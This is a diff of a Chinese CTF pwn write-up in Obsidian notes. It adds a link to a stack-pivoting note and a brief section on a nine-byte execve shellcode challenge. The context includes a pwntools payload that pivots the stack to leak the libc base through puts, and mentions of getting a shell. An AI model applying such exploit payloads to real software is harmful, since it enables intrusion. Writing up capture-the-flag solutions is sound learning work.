@@ -230,7 +230,7 @@ log.success('stack_addr: ' + hex(stack_addr))
 ![[Pasted image 20250211193005.png]]
 第四步，泄露了stack段后开始着手构造栈迁移来泄漏libc基址。
 ![[Pasted image 20250211193129.png]]
-查看栈上空间可以发现有__libc_start_main + 128，将栈迁移过去就可以再次利用puts来泄漏。(栈迁移详见我另一篇文章)
+查看栈上空间可以发现有__libc_start_main + 128，将栈迁移过去就可以再次利用puts来泄漏。(栈迁移详见我另一篇文章[[栈迁移]])
 ```python
 # payload4开始构造栈迁移泄漏libc基址
 payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
@@ -325,6 +325,8 @@ p.interactive()
 shell：
 ![[Pasted image 20250211193735.png]]
 ## unjoke
+![[Pasted image 20250211194038.png]]
+shellcode题，构造一个九字节以内的execve即可~~不会去问DeepSeek~~。
 
 ## Natro
 不会
